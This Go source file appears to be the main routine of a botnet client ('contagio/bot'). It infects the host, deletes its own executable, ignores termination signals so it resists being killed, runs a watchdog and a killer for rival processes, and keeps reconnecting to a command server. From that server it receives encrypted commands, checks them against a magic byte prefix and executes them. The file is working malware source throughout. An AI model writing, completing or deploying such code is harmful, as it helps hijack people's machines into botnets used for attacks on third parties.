package main

import (
	"bytes"
	"contagio/bot/config"
	"contagio/bot/methods"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
	"time"
)

type BotInfo struct {
	Arch string
}

var TestMode bool
var Bot *BotInfo

func main() {
	defer methods.Catch()

	if len(os.Args) > 1 {
		if os.Args[1] == "-test" {
			TestMode = true
		}

	}

	config.Config()

	if !TestMode {

		if config.DEBUG {
			pid := syscall.Getpid()
			fmt.Println("Process id: ", pid)
		}

		addr := syscall.SockaddrInet4{
			Port: 63643,
			Addr: [4]byte{127, 0, 0, 1},
		}

		var attempts int
	TryToBind:
		if fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0); err == nil {
			defer syscall.Close(fd)

			err := syscall.Bind(fd, &addr)
			if err != nil {
				if config.DEBUG {
					fmt.Println("[init] Can't bind 63643 port: " + err.Error())
				}
				attempts++
				if attempts >= 4 {
					os.Exit(1)
				}
				KillByPort(63643)
				time.Sleep(1 * time.Second)
				goto TryToBind
			}

			err = syscall.Listen(fd, 1)
			if err != nil && config.DEBUG {
				fmt.Println("[init] Can't listen 63643 port: " + err.Error())
			}
		}

		CpuMonitor()

		InfectSystem()

		go Watchdog()

		if config.KILLER_ENABLED {
			go KillerInit()
		}

		// return

		if runtime.NumCPU() >= config.SCANNER_MIN_NUM_CPU {
			if config.SCANNER_ENABLED {

				// SOON

				// go StartScanner()
			}
		}

		defer methods.Catch()

		go signals(uintptr(syscall.Getpid()))

		exec.Command("ulimit", "-n", "99999").Run()

		if config.PID_CHANGER {
			syscall.Unlink(os.Args[0])
		}

	} else {
		fmt.Println("TEST MODE: YES")
	}

	Bot = initbot()

CONNECT:
	connection, err := Connect()
	if err != nil || connection == nil {
		time.Sleep(1 * time.Second)
		goto CONNECT
	}

	if config.DEBUG {
		fmt.Println("[main] Connected to bot server!")
	}
	for {

		command := make([]byte, 2000)

		n, err := connection.Read(command)
		if err != nil {
			goto CONNECT
		}

		if len(command[:n]) < 5 {
			continue
		}

		if bytes.HasPrefix(command, []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0}) { // null command
			continue
		}

		if !bytes.HasPrefix(command, []byte{255, 255, 10, 29, 49, 19, 10, 12, 44, 202}) {
			continue
		}

		cmd := Decrypt(command[:n])

		if cmd == "" { // error
			if config.DEBUG {
				fmt.Println("Decrypt error")
			}
			continue
		}

		CommandHandler(cmd)
	}
}

func signals(pid uintptr) {
	defer methods.Catch()

	if !config.IGNORE_SIGNALS {
		return
	}
	c := make(chan os.Signal, 1)

	signal.Notify(c, syscall.Signal(2), syscall.Signal(3), syscall.Signal(4), syscall.Signal(5), syscall.Signal(6), syscall.Signal(7), syscall.Signal(8), syscall.Signal(9), syscall.Signal(10), syscall.Signal(11), syscall.Signal(12), syscall.Signal(13), syscall.Signal(14), syscall.Signal(15), syscall.Signal(16), syscall.Signal(17), syscall.Signal(18), syscall.Signal(19), syscall.Signal(20), syscall.Signal(21), syscall.Signal(22), syscall.Signal(24), syscall.Signal(25), syscall.Signal(26), syscall.Signal(27), syscall.Signal(28), syscall.Signal(30), syscall.Signal(31))

	// signal.Notify(c, syscall.Signal(2))
	for {
		s := <-c
		switch s {
		default:
			if config.PID_CHANGER {
				updatePid(pid)
			}
			continue
			// os.Exit(1)
		}
	}
}

func initbot() *BotInfo {
	defer methods.Catch()

	var arch string

	if runtime.GOOS == "" {
		arch = "undefined"
	} else {
		arch = runtime.GOARCH
	}

	return &BotInfo{
		Arch: arch,
	}
}
